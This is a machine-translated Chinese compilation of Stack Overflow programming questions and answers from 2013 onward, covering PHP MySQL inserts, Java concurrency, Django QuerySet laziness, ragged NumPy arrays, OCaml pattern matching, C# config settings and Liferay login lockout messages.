$insert_array['url'] = $get_source;
$insert_array['video'] = $video;
$insert_array['date'] = $date;
insert(DATABASE, $content_table, $insert_array); 
```

所有这一切的结果添加了一行带有 id（key、autoimcrement）、url 和 date 的行。标题、内容和视频为空白。如果我回显标题我得到正确的结果，如果我 var_dump 标题我得到字符串（15）“blablablabla”，再次正确。

现在，如果我手动设置 $title = "asdf"; 它被正确插入。内容和视频也是如此。

表结构

id int(8) 无符号 NO PRI NULL auto_increment

标题 varchar(1000) 是 NULL

内容长文本 YES NULL

视频 varchar(3000) 是 NULL

url varchar(300) 是 NULL

日期 日期 YES NULL

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:18:03.517

尝试：

```
function insert($database, $table, $data_array)
{
    # Connect to MySQL server and select database
    $mysql_connect = connect_to_database();
    mysql_select_db($database, $mysql_connect);

    $cols = array();
    $vals = array();
    foreach ($data_array as $key => $value) {
        $cols[] = "`" . $key . "`";
        if (is_int($value) || is_float($value)) {
            $vals[] = $value;
        } else {
            $vals[] = "'" . mysql_real_escape_string($value) . "'";
        }
    }

    $sql = "INSERT INTO " . $table
         . ' (' . implode(', ', $cols) . ') '
         . 'VALUES (' . implode(', ', $vals) . ')';

    $result = mysql_query($sql, $mysql_connect);

    # Report SQL error, if one occured, otherwise return result
    if(mysql_error($mysql_connect)) {
        echo "MySQL Update Error: " . mysql_error($mysql_connect);
        $result = ""; // FIXME should probably return false here
    } else {
        return $result;
    }
} 
```

**重要的**

您的代码和上面的代码可能容易受到 SQL 注入的攻击。去了解他们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:20:34.503

尝试在变量中添加引号。:-) 原因是您的 MYSQL 列类型设置为 VARCHAR。并且插入数据要求您用引号将插入内容括起来。

顺便说一句，如果这是新代码，我建议切换到 MYSQLI 或 PDO 库。

# java - 这个同步块是否需要？

> ID：14916400
> 
> 赞同：0
> 
> 时间：2013-02-16T23:41:50.780
> 
> 标签：java, multithreading, synchronized-block

对于多线程环境中的这段代码，是否需要同步（c）？

```
SynchronizedCounter c = new SynchronizedCounter();
synchronized(c){
   c.increment();
   c.value();
}

public class SynchronizedCounter {
   private int c = 0;

   public synchronized void increment() {
     c++;
    }
   public synchronized void decrement() {
     c--;
   }
   public synchronized int value() {
     return c;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:20:01.843

如果您希望 getValue 调用查看增量的结果，而无需干预来自另一个线程的增量或减量，则确实需要 synchronized(c)。

这是一个非常普遍的要求，类似的设计经常从增量或减量调用返回新值。例如，参见[java.util.concurrent.atomic.AtomicInteger](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/atomic/AtomicInteger.html)。它具有诸如 incrementAndGet() 之类的方法。

顺便说一句，如果您真的在使用此代码，而不仅仅是用它来说明您的问题，请考虑使用 AtomicInteger。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T23:48:03.997

如果您**想**确保`c.value()`在`c.increment();`您收到`value + 1`

避免在调用和调用之间出现另一个`thread2`调用的情况`c.decrement()``c.increment()``c.value()``thread1`

# python - 为什么/如何迭代列表并每次调用“通过”修复此功能？

> ID：14916403
> 
> 赞同：3
> 
> 时间：2013-02-16T23:42:17.057
> 
> 标签：python, django

我写了以下函数：

```
def auto_update_ratings(amounts, assessment_entries_qs, lowest_rating=-1):
    start = 0
    rating = lowest_rating
    ids = assessment_entries_qs.values_list('id', flat=True)

    for i in ids: # I have absolutely no idea why this seems to be required:
        pass      # without this loop, the last AssessmentEntries fail to update 
                  # in the following for loop.

    for amount in amounts:
        end_mark = start + amount
        entries = ids[start:end_mark]
        a = assessment_entries_qs.filter(id__in=entries).update(rating=rating)
        start = end_mark
        rating += 1 
```

它会做它应该做的事情（即更新相关的条目数量，`assessment_entries_qs`每个评分（从 开始`lowest_rating`），如 中指定的那样`amounts`）。这是一个简单的例子：

```
>>> assessment_entries = AssessmentEntry.objects.all()
>>> print [ae.rating for ae in assessment_entries]
[None, None, None, None, None, None, None, None, None, None]
>>>
>>> auto_update_ratings((2,4,3,1), assessment_entries, 1)
>>> print [ae.rating for ae in assessment_entries]
[1, 1, 2, 2, 2, 2, 3, 3, 3, 4] 
```

但是，如果我在遍历`ids`之前不遍历`amounts`，该函数只会更新查询集的一个子集：使用我当前的测试数据（查询集中大约 250 个`AssessmentEntries`），它总是导致正好 84个`AssessmentEntries`没有被更新。

有趣的是，它始终是第二个 for 循环的最后一次迭代，它不会导致任何更新（尽管该迭代中的其余代码确实执行正确），*以及前一次迭代的一部分*。查询集在传递给此函数之前是ordered_by('?')，如果我简单地添加前面的“空”for循环，就可以达到预期的结果，所以我的数据似乎没有问题）。

更多细节，以防万一它们被证明是相关的：

*   `AssessmentEntry.rating`是一个标准`IntegerField(null=True,blank=True)`。
*   我使用这个函数纯粹是为了测试目的，所以我只从 iPython 执行它。
*   测试数据库是 SQLite。

**问题：**有人可以解释为什么我似乎需要迭代`ids`，尽管实际上没有以任何方式接触数据，以及为什么不这样做，函数仍然（有点）正确执行，但总是无法更新最后几项尽管显然仍在迭代它们，但查询集？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T00:12:52.917

QuerySets 和 QuerySet 切片是*惰性*求值的。迭代 ids 执行查询并使`ids`行为类似于静态列表而不是 QuerySet。因此，当您遍历 时`ids`，它会导致`entries`稍后成为一组固定的值；但是如果你*不*循环`ids`，那么`entries`只是一个子查询，`LIMIT`添加了一个子句来表示你所做的切片。

以下是详细情况：

```
def auto_update_ratings(amounts, assessment_entries_qs, lowest_rating=-1):
    # assessment_entries_qs is an unevaluated QuerySet
    # from your calling code, it would probably generate a query like this:
    # SELECT * FROM assessments ORDER BY RANDOM()
    start = 0
    rating = lowest_rating
    ids = assessment_entries_qs.values_list('id', flat=True)
    # ids is a ValueQuerySet that adds "SELECT id"
    # to the query that assessment_entries_qs would generate.
    # So ids is now something like:
    # SELECT id FROM assessments ORDER BY RANDOM()

    # we omit the loop

    for amount in amounts:
        end_mark = start + amount
        entries = ids[start:end_mark]
        # entries is now another QuerySet with a LIMIT clause added:
        # SELECT id FROM assessments ORDER BY RANDOM() LIMIT start,(start+end_mark)
        # When filter() gets a QuerySet, it adds a subquery
        a = assessment_entries_qs.filter(id__in=entries).update(rating=rating)
        # FINALLY, we now actually EXECUTE a query which is something like this:
        # UPDATE assessments SET rating=? WHERE id IN 
        # (SELECT id FROM assessments ORDER BY RANDOM() LIMIT start,(start+end_mark))
        start = end_mark
        rating += 1 
```

由于*每次插入时*`entries`都会执行子查询并且它具有随机顺序，因此您所做的切片是没有意义的！此函数没有确定性行为。

 *但是，当您迭代 ids 时，您实际上会执行查询，因此您的切片再次具有确定性行为，并且代码会执行您期望的操作。

让我们看看当你使用循环时会发生什么：

```
ids = assessment_entries_qs.values_list('id', flat=True)

# Iterating ids causes the query to actually be executed
# This query was sent to the DB:
# SELECT id FROM assessments ORDER BY RANDOM()
for id in ids:
    pass

# ids has now been "realized" and contains the *results* of the query
# e.g., [5,1,2,3,4]
# Iterating again (or slicing) will now return values rather than modify the query

for amount in amounts:
    end_mark = start + amount
    entries = ids[start:end_mark]
    # because ids was executed, entries contains definite values
    # When filter() gets actual values, it adds a simple condition
    a = assessment_entries_qs.filter(id__in=entries).update(rating=rating)
    # The query executed is something like this:
    # UPDATE assessments SET rating=? WHERE id IN (5,1)
    # "(5,1)" will change on each iteration, but it will always be a set of
    # scalar values rather than a subquery.
    start = end_mark
    rating += 1 
```

如果您需要急切地评估一个 QuerySet 以立即获取其所有值，而不是执行无操作迭代，只需将其转换为列表：

```
 ids = list(assessment_entries_qs.values_list('id', flat=True)) 
```

Django 文档还详细介绍了[何时`QuerySet`评估](https://docs.djangoproject.com/en/dev/ref/models/querysets/#when-querysets-are-evaluated)a 。*

# python - 如何在 NumPy 中堆叠不同长度的向量？

> ID：14916407
> 
> 赞同：37
> 
> 时间：2013-02-16T23:42:41.603
> 
> 标签：python, numpy

如何堆叠x 可以是任意数字`n`的形状的列方向向量？`(x,)`

例如，

```
from numpy import *
a = ones((3,))
b = ones((2,))

c = vstack((a,b)) # <-- gives an error
c = vstack((a[:,newaxis],b[:,newaxis])) #<-- also gives an error 
```

`hstack`工作正常，但沿错误的维度连接。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2013-02-16T23:48:15.813

简短的回答：你不能。NumPy 本身不支持锯齿状数组。

长答案：

```
>>> a = ones((3,))
>>> b = ones((2,))
>>> c = array([a, b])
>>> c
array([[ 1\.  1\.  1.], [ 1\.  1.]], dtype=object) 
```

*给出一个可能会或可能不会*像您期望的那样运行的数组。例如，它不支持`sum`or之类的基本方法`reshape`，您应该像对待普通 Python 列表一样对待`[a, b]`它（迭代它以执行操作，而不是使用矢量化习语）。

存在几种可能的解决方法；最简单的方法是强制`a`并`b`达到一个共同的长度，可能使用[掩码数组](http://docs.scipy.org/doc/numpy/reference/maskedarray.html)或 NaN 来表示某些索引在某些行中无效。例如，这`b`是一个掩码数组：

```
>>> ma.array(np.resize(b, a.shape[0]), mask=[False, False, True])
masked_array(data = [1.0 1.0 --],
             mask = [False False  True],
       fill_value = 1e+20) 
```

这可以堆叠`a`如下：

```
>>> ma.vstack([a, ma.array(np.resize(b, a.shape[0]), mask=[False, False, True])])
masked_array(data =
 [[1.0 1.0 1.0]
 [1.0 1.0 --]],
             mask =
 [[False False False]
 [False False  True]],
       fill_value = 1e+20) 
```

（出于某些目的，`scipy.sparse`也可能很有趣。）

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-07-28T18:08:13.193

通常，将不同长度的数组放在一起存在歧义，因为数据的对齐可能很重要。`Pandas`有不同的高级解决方案来处理这个问题，例如将系列合并到数据帧中。

如果您只想从第一个元素开始填充列，我通常做的是构建一个矩阵并填充列。当然，您需要用空值填充矩阵中的空格（在这种情况下`np.nan`）

```
a = ones((3,))
b = ones((2,))
arraylist=[a,b]

outarr=np.ones((np.max([len(ps) for ps in arraylist]),len(arraylist)))*np.nan #define empty array
for i,c in enumerate(arraylist):  #populate columns
    outarr[:len(c),i]=c

In [108]: outarr
Out[108]: 
array([[  1.,   1.],
       [  1.,   1.],
       [  1.,  nan]]) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-10-29T19:40:06.917

有一个用于有效处理此类数组的新库：[https ://github.com/scikit-hep/awkward-array](https://github.com/scikit-hep/awkward-array)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-09T01:55:23.713

如果您确实想使用 NumPy，您可以将形状与 np.nan 匹配，然后稍后“解包” nan 填充的数组。这是一个带有函数的示例。

```
import numpy as np
from numpy import *

a = np.array([[3,3,3]]).astype(float)
b = np.array([[2,2]]).astype(float)

# Extend each vector in array with Nan to reach same shape
def Pack_Matrices_with_NaN(List_of_matrices, Matrix_size):
    Matrix_with_nan = np.arange(Matrix_size)
    for array in List_of_matrices:
        start_position = len(array[0])
        for x in range(start_position,Matrix_size):
            array = np.insert(array, (x), np.nan, axis=1)
        Matrix_with_nan = np.vstack([Matrix_with_nan, array])
    Matrix_with_nan = Matrix_with_nan[1:]
    return Matrix_with_nan

arrays = [a,b]
packed_matrices = Pack_Matrices_with_NaN(arrays, 5)
print(packed_matrices) 

Output:
[[ 3\.  3\.  3\. nan nan]
 [ 2\.  2\. nan nan nan]] 
```

但是，最简单的方法是将数组附加到列表中：

```
import numpy as np
a = np.array([3,3,3])
b = np.array([2,2])
c = []

c.append(a)
c.append(b)

print(c)

Output:
[array([3, 3, 3]), array([2, 2])] 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2019-11-08T17:13:31.173

我知道这是一个非常古老的帖子，并且可能有更好的方法来做到这一点，但为什么不直接使用 append 进行这样的操作：

```
import numpy as np
a = np.ones((3,))
b = np.ones((2,))
c = np.append(a, b)
print(c) 
```

输出：

```
[1\. 1\. 1\. 1\. 1.] 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2021-03-30T06:36:39.960

我使用以下代码将不同长度的列表组合在一个 numpy 数组中，并将长度信息保存在第二个数组中：

```
import numpy as np

# create an example list (number can be increased):
my_list=[np.ones(i) for i in np.arange(1000)]
# measure and store length and find max:
dlc=np.array([len(i) for i in my_list]) #list contains the data length code
max_length=max(dlc)
# now we allocate an empty array
result=np.empty(max_length*len(my_list)).reshape(len(my_list),max_length)
# populate:
for i in np.arange(len(dlc)):
    result[i][np.arange(dlc[i])]=my_list[i]
# check how the 10th element looks like
print(result[10],dlc[10]) 
```

我确信在循环的情况下可以改进代码。但它已经很快工作了，因为内存是由空数组预先分配的。

# java - linux中的网络接口未被检测到

> ID：14916408
> 
> 赞同：1
> 
> 时间：2013-02-16T23:42:54.550
> 
> 标签：java, linux, windows, network-programming, network-interface

我尝试了以下代码：

```
NetworkInterface[] devices = JpcapCaptor.getDeviceList();
    JpcapCaptor jpcap = null;
    System.out.print(devices.length);
    for (int a=0;a<devices.length;a++)
    {
        try
        {
            jpcap = JpcapCaptor.openDevice(devices[a], 2000, true, 20);
            jpcap.loopPacket(-1, new arp_spoofing());//for capture packet
        } 
        catch (IOException ex) 
        {
            Logger.getLogger(Receiver2.class.getName()).log(Level.SEVERE, null, ex);
        }
    } 
```

在相同的代码中。当我在 Windows 中运行时，我得到了一些界面，但在 linux 中我没有得到任何界面.. 没有语法错误..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:46:14.533

这可能是 Linux 无法检测到该接口，因此它也不适用于任何 Java 程序。如果运行以下命令会得到什么？

```
sudo ifconfig 
```

将其添加到问题中，以便更容易诊断问题。这里有一个相关的问题，在 Unix/Linux StackExchange 上：

[https://unix.stackexchange.com/questions/48980/cannot-get-realtek-r8168-ethernet-card-up/52451#52451](https://unix.stackexchange.com/questions/48980/cannot-get-realtek-r8168-ethernet-card-up/52451#52451)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T10:39:22.167

当我在 Ubuntu 11.10 和 netbeans 中运行时，我遇到了同样的问题。当我尝试使用终端（具有 sudo 权限）运行 jar 文件时，它起作用了。我认为问题在于linux中的权限。

尝试在终端中运行 .jar 文件`sudo java -jar YourJarFile.jar`

# iphone - 如何在 iOS 中写入服务器/URL？

> ID：14916412
> 
> 赞同：0
> 
> 时间：2013-02-16T23:43:38.070
> 
> 标签：iphone, ios, xcode, url, serialization

基本上，如何将数据存储在其他设备可以访问的 URL 中？

这类似于 Instagram 的工作方式，人们可以看到其他人发布的图片，即使这些文件没有本地存储在用户的设备上。

这也可能是一种在不使用 GameCenter 的情况下在游戏中创建高分排行榜的方法。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:57:13.277

您需要某种形式的服务器支持，例如 php、asp 等。请查看[HTTP POST](http://en.wikipedia.org/wiki/POST_%28HTTP%29)，对于 iOS，请查看[NSURLConnection Class Reference](http://developer.apple.com/library/ios/#documentation/cocoa/reference/foundation/Classes/NSURLConnection_Class/Reference/Reference.html)，甚至更好的是[AFNetworking](https://github.com/AFNetworking/AFNetworking)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:52:43.890

NSURLRequest 类更适合用于通过 URL 执行请求。因此，如果您通过接受 POST 数据的 URL 有一些 RESTful 后端，您将能够推送二进制文件。您可以通过以下 URL 找到类似于您的请求的代码 iOS 示例 -[将图像作为二进制数据发送到服务器](https://stackoverflow.com/questions/2323709/send-image-to-server-as-binary-data)

对于服务器端，我建议查看 node.js 方向（[http://nodejs.org](http://nodejs.org)）

# java - Java程序不从数组中输出负整数？

> ID：14916418
> 
> 赞同：0
> 
> 时间：2013-02-16T23:44:14.237
> 
> 标签：java, arrays, file-io, integer, negative-number

我的 Java 任务之一是从文件中获取数字，然后将它们分成两个数组。一个名为 P（正数）和 N（负数）。我让它为正数工作，但负数一直输出 0。我不知道为什么！帮助？

```
import java.io.*;
import java.util.*;

public class Prog404a {
    public static void main(String[] args) {
        Scanner inFile = null;
        try {
            inFile = new Scanner(new File("prg404a1.dat"));
        } catch (FileNotFoundException e) {
            System.out.println("File not found!!");
            System.exit(0);
        }
        int temp = 0;
        int P[] = new int[23];
        int N[] = new int[23];
        int i = 0;
        while (inFile.hasNext()) {
            temp = inFile.nextInt();
            if (temp < 0) {
                N[i] = temp;
            }
            if (temp > 0) {
                P[i] = temp;
            }
            i++;
        }
        for (int x = 0; x < i; x++) {
            System.out.println(P[x] + "\t" + N[x]);
        }
    }
} 
```

编辑：没关系，它也不适用于正数。只有一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T23:47:33.720

也许你只是没有数对吗？

您应该使用两个计数器，一个用于正数，一个用于负数。否则，一半的条目显然会为 0，因为它们*从未设置过*。

# list - 为什么带变量的模式不匹配？

> ID：14916421
> 
> 赞同：2
> 
> 时间：2013-02-16T23:45:04.013
> 
> 标签：list, functional-programming, pattern-matching, ocaml

我正在编写一个可以找到列表中位数的代码，我不能使用rec，应该使用List.fold_left/right。我编写了以下代码，它应该可以工作。

它找到列表的长度，如果是奇数（如 5），则将 len1、len2 设置为 2、3，如果是偶数（如 6），则将 len1、len2 设置为 2、3。

然后对于列表中的每个成员，我匹配小于它的那些元素的数量。
但是，以下模式匹配总是将数学 lessNum elmt 匹配到 len1 - 有人可以告诉我为什么会这样吗？

```
let median (lst : int list) : float option =
  let len = List.length lst in
  if lst = [] then None
  else 
    let len1, len2 = (len - 1) / 2, (len + 1) / 2 in
    let lessNum a =
      List.length (List.find_all (fun n -> n < a) lst) in 
    let answer = List.fold_left (fun accm elmt -> 
      match (lessNum elmt) with 
        | len1 -> accm + elmt
        | len2 -> failwith "len2"
        | _ -> failwith "other"
) 0 lst in
    if len mod 2 = 0 
    then Some ((float_of_int answer) /. 2.0)
    else Some (float_of_int answer) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T23:54:42.973

出现在模式中的标识符始终匹配，并将相应的值绑定到标识符。标识符的任何当前值都无关紧要：模式导致一个新的绑定，即，它为标识符提供一个*新*值（就在匹配内部）。

```
# let a = 3;;
val a : int = 3
# match 5 with a -> a;;
- : int = 5
# a;;
- : int = 3
# 
```

所以，你的 match 声明没有做你认为的那样。您可能必须对`if`代码的那一部分使用 an 。

**更新**

以下是如何使用关联列表来近似`f`您的后续问题中的函数：

```
let f x = List.assoc x [(pat1, ans1); (pat2, ans2)] 
```

如果不等于or ，这将引发`Not_found`异常。`x``pat1``pat2`

（我认为您的 Python 代码丢失了`return`。）

# php - 通过 PHP 解析 css 颜色通道

> ID：14916423
> 
> 赞同：0
> 
> 时间：2013-02-16T23:45:07.743
> 
> 标签：php, css

我如何通过 PHP 从颜色字符串中获取单独的通道，例如：“#1122f0”来获得这个：

```
$color = substr("#1122f0", 1); // get "1122f0"
// wanted:
$red = 0x11;
$green = 0x22;
$blue = 0xf0; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:52:05.900

```
list($red, $green, $blue) = array_map('dechex',
  sscanf('#1122f0', '#%02x%02x%02x')); 
```

您还可以将组件解析为字符串：

```
list($red, $green, $blue) = sscanf('#1122f0', '#%02s%02s%02s'); 
```

但是第一个解决方案也会（某种程度上）验证您的颜色字​​符串:)

# php - 动态 Facebook Like 按钮

> ID：14916425
> 
> 赞同：0
> 
> 时间：2013-02-16T23:45:17.277
> 
> 标签：php, javascript, facebook, facebook-like

我有很多这样的页面：

www.mysite/directory/title?title=$title

所以你可以看到每个页面都是动态的。正如在我想让我的 facebook 为动态 url 生成按钮之前多次被问到的那样。我注意到去年年底对“赞”按钮进行了一些更改，因此一直在尝试查找有关此的最新帖子。

我遇到的问题是 Facebook 错误，它声明它需要一个绝对 URL，或者它只是将类似按钮引用到 Facebook 设置的内容，在这种情况下是我的登录页面。

我尝试了以下方法：

 `````
 // Load the SDK's source Asynchronously
  // Note that the debug version is being actively developed and might 
  // contain some type checks that are overly strict. 
  // Please report such bugs using the bugs tool.
  (function(d, debug){
     var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement('script'); js.id = id; js.async = true;
     js.src = "//connect.facebook.net/en_US/all" + (debug ? "/debug" : "") + ".js";
     ref.parentNode.insertBefore(js, ref);
   }(document, /*debug*/ false));
</script>

    <script type="text/javascript">
      var sUrl = "http://www.mysite.com/";
      document.getElementById('fb').setAttribute('href', sUrl);
    </script>  
<div class="fb-like" id="fb"  data-send="true" data-layout="button_count" data-width="60" data-show-faces="true"></div> 
````  `和：

```
<?php $url = basename($_SERVER['REQUEST_URI']);?>
<div class="fb-like" data-send="false" data-layout="button_count" data-width="450" data-show-faces="true"></div> 
```

随着：

```
 <div id="fb-root"></div><script src="http://connect.facebook.net/en_US/all.js#appId=186609524720286&amp;xfbml=1"></script>
<div id="fblikeblock"></div>
<script>
    var url = 'http://apps.facebook.com/inflatableicons/image_preview.html?y=120';
    jQuery("#fblikeblock").html('<fb:like id="fbLike" href="'+url+'" send="true" width="450" show_faces="true" font=""></fb:like>');
    FB.XFBML.parse(document.getElementById('fblikeblock'));
    console.log(document.getElementById('fblikeblock'));
  </script> 
```

不要忘记：

```
<fb:like></fb:like> 
```

在调用 FB.XFBML.parse 之后。

我没有成功，但正如你所看到的，现在已经用很多方法尝试过了，而且很卡住。有任何想法吗？

谢谢！

编辑：

url 是编码的，所以今天我尝试了以下 - 仍然是相同的结果。我在 Stack 上看到的所有地方都表明这些方法中的任何一种都应该有效，但我无处可去：

```
<div class="fb-like" id="fb" data-href="<?php urlencode($url);?>" data-send="true" data-width="450" data-show-faces="true"></div> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:51:08.863

use data-href for the like url. [https://developers.facebook.com/docs/reference/plugins/like/](https://developers.facebook.com/docs/reference/plugins/like/)``

# c# - 在 C# 中从 .config 文件调用设置返回值的类型而不是值

> ID：14916429
> 
> 赞同：0
> 
> 时间：2013-02-16T23:45:41.477
> 
> 标签：c#, serialization, windows-services, app-config

我有 2 个 C# 项目。项目 A 可以访问项目 B 的 .config 文件（通过内部应用程序设置）。我有功能证明，因为 B 可以访问项目 A 配置文件的特定值。

当查询项目 A 的配置文件中的一个特定值时，项目 B 会返回它的类型。这很奇怪。

我有相同的代码块，但 Proj B 返回类型，Proj A 返回值。

值得注意的是，值本身是一个被序列化的对象列表。这些项目可以随意序列化和反序列化，没有任何困难，这是在各个部分完成的。两个项目都使用了相同的代码，在项目 B 中，在脱轨期间，项目使用 MessageBox.Show 或 EventLog.Write() 输出脱轨前的当前值，在项目 A 中显示值。 ..

```
</xml version="1.0"?><MyValues xmlns:xsi="http://wwww.w3.org/2001/XMLSchema-instance" ... 
```

然而，在项目 B 中，它很简单地说：

```
System.Collection.Generic.List'MyObjectType 
```

或者类似的东西，尽管代码是相同的。在反序列化之前，它肯定与配置文件有关，或者可能是 Windows 服务如何解释它。

实际上没有任何我可以引用的代码可以提供帮助，因为代码是相同的，因为它是改变代码的环境。

我希望有人能解释一下，因为它是共享 .config 文件的 Windows 服务和 Windows 窗体。

**编辑：**

```
string temp = Settings.Default.MySettings; 
```

在项目 A 中打印出 temp =

```
...</xml version="1.0"?><MyValues xmlns:xsi="ht... 
```

打印项目 B 中的温度 =

```
System.Collections.Generic.List`1[ProjectA.MyClass] 
```

*(temp = some XML values) 但是，另一个项目中的相同代码给出了一些对象类型的代码。尽管在纯文本中没有明确列出对象类型？*

*（可能要到早上才回复）*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:50:17.240

我无法具体说明问题出在哪里，因为您没有发布任何实际代码，但我可以告诉您，您在某个地方依赖于对`string`类型的隐式转换。这是您在调用`.ToString()`列表时看到的。可能它在其他地方也有效，因为您传递的是单个对象而不是列表，并且您的类型会覆盖`.ToString()`，因此隐式字符串转换会产生有意义的结果。主要的是，在一种情况下您使用单个对象，而在另一种情况下您发送对象集合。

# ios - iOS 二进制数据列未显示在 Sqlite 数据库中？

> ID：14916432
> 
> 赞同：2
> 
> 时间：2013-02-16T23:46:08.373
> 
> 标签：ios, objective-c, cocoa

大家好，我有以下设置：

![数据](../Images/79d85da2b9ddc83446ed9b82a696ab84.png)

这是我的定义

```
@interface Item : NSManagedObject

@property (nonatomic, retain) NSNumber * cid;
@property (nonatomic, retain) NSData * image_data;
@property (nonatomic, retain) NSString * image_url;
@property (nonatomic, retain) NSNumber * order_id;
@property (nonatomic, retain) NSNumber * status;
@property (nonatomic, retain) NSString * title;
@property (nonatomic, retain) NSString * url; 
```

然而不知何故，我只在我的 sqlite3 数据库中看到以下内容：

```
sqlite> .schema ZITEM
CREATE TABLE ZITEM ( Z_PK INTEGER PRIMARY KEY, Z_ENT INTEGER, Z_OPT INTEGER, ZCID INTEGER, ZORDER_ID INTEGER, ZSTATUS INTEGER, ZIMAGE_URL VARCHAR, ZTITLE VARCHAR, ZURL VARCHAR ); 
```

这里的任何人都知道为什么没有 ZIMAGE_DATA 作为这些列之一？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T14:25:11.487

获取后找出 image_data 的值是否仍然存在。这将使您了解该值是否保存在其他地方，例如外部存储。

此外，请确保未为该属性设置**瞬态。**

# java - 在远程服务器上用 Java 运行批处理文件

> ID：14916438
> 
> 赞同：0
> 
> 时间：2013-02-16T23:46:43.007
> 
> 标签：java, batch-file, processbuilder, psexec

我正在尝试使用 Java 与使用 psexec 在远程服务器上执行命令的大型批处理文件进行交互。

我可以使用 process builder 启动文件，它适用于大多数命令，但似乎挂断了。

批处理文件中的一个特定命令如下：

```
ECHO .
Echo Which would you like to reboot?
Echo 1-10\. For computers, enter computer number.
Echo E. Exit
set /p userinp=choose a number(0-22): 
```

但从Java我得到：。您要重新启动哪个？1-10。对于计算机，输入计算机编号。E. 退出

然后它挂起

它显然不是在读取 set 行，但更重要的是我还没有弄清楚如何将输入传递回子进程。

```
String[] command = {"cmd", "/c", "batchfile", "restart"};
ProcessBuilder builder = new ProcessBuilder(command);
builder.directory(new File("C:\\"));
    Process process = builder.start();

InputStream is = process.getInputStream();
    InputStreamReader isr = new InputStreamReader(is);
    BufferedReader br = new BufferedReader(isr);

    String line;
    while ((line = br.readLine()) != null) {
        System.out.println(line);
    } 
```

任何输入将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:53:37.337

您的批处理作业需要您实际提供输入才能继续，这就是它看起来“挂起”的原因。您需要通过其输出流将此输入提供给流程。一个***高度***简化的例子：

```
PrintWriter writer = new PrintWriter(process.getOutputStream());
writer.println("10");
writer.flush(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:54:54.617

您的进程不会挂起，它只是等待命令行中的一些输入，然后再继续。

当您通过 读取进程的输出时`Process.getInputStream()`，您可以使用 将输入发回给它[`Process.getOutputStream()`](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Process.html#getOutputStream%28%29)。

> 公共抽象输出流 getOutputStream()
> 
> 获取子流程的输出流。流的输出通过管道传输到此 Process 对象表示的进程的标准输入流中。实施说明：缓冲输出流是个好主意。
> 
> 返回：连接到子进程正常输入的输出流。

# login - 在客户被暂时锁定之前，如何显示可用的登录尝试次数？

> ID：14916441
> 
> 赞同：0
> 
> 时间：2013-02-16T23:47:12.767
> 
> 标签：login, liferay, lockout

**我刚刚使用Liferay**完成了一个客户网站的实施。该服务运作良好。改进的机会之一是减少来自被锁定客户的电话数量；我们的限制是 5。这个想法是向将在下次尝试时被锁定的客户发出警告，并建议他们改用“忘记密码”工作流程。

请注意，我们定义***了 auth.pipeline.pre=our-class***。在处理身份验证时，我可以轻松读取用户记录并找出尝试了多少次失败的登录；我不知道该怎么做会导致***Liferay 登录***操作处理程序注册一个可以被***login.jsp***检测到的异常。***我怀疑这可能很难，因为我的auth.pipeline.pre=our-class***类只能返回 3 个值，而且它们都没有所需的语义。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-19T06:58:39.917

这可以通过挂钩 login.jsp 并覆盖 liferay-ui:error 标记中的 AuthException 消息来完成，如下所示。

```
Boolean isMaxFailedLoginAttempt = false;
PortletRequest portletRequest = (PortletRequest)request.getAttribute(JavaConstants.JAVAX_PORTLET_REQUEST);
if(SessionErrors.contains(portletRequest, AuthException.class.getName())) { 
    User u = UserLocalServiceUtil.getUserByEmailAddress(company.getCompanyId(), login); 
    if(u != null) { 
        if(u.getFailedLoginAttempts() == 5) {
        isMaxFailedLoginAttempt = true;
    } 
    }
}

if(isMaxFailedLoginAttempt) {
%>  
    <liferay-ui:error exception="<%= AuthException.class %>" message="The username or   password you entered is incorrect; another incorrect login will temporarily lock your account. Please use forgot password link to reset the password." />
<%
   } else {
%>  
   <liferay-ui:error exception="<%= AuthException.class %>" message="The username or password you entered is incorrect. Please try again." />
<%      
   }
%> 
```

`

# javascript - 根据动态变化的 div 的高度更新 div 的边距

> ID：14916444
> 
> 赞同：0
> 
> 时间：2013-02-16T23:47:28.170
> 
> 标签：javascript, jquery, dynamic, height

我想知道这是否可以使用 jQuery 或 JS。

我在 div 上设置了一个边距，该边距是通过获取包含图像的容器的高度来设置的。

```
var articleImageHeight = $('.slides_control').height();
$('.individual-article-contents').css('margin-top', articleImageHeight); 
```

然而，容器的图像本质上是一个滑块，所以这个容器的高度是可以改变的。

我想知道是否可以`articleImageHeight`随着容器高度的变化实时更新变量？

我正在使用[slidesJS](http://www.slidesjs.com/)作为容器中的滑块。

这是我正在做的一个例子：http: [//goo.gl/FdftC](http://goo.gl/FdftC)

非常感谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:16:53.653

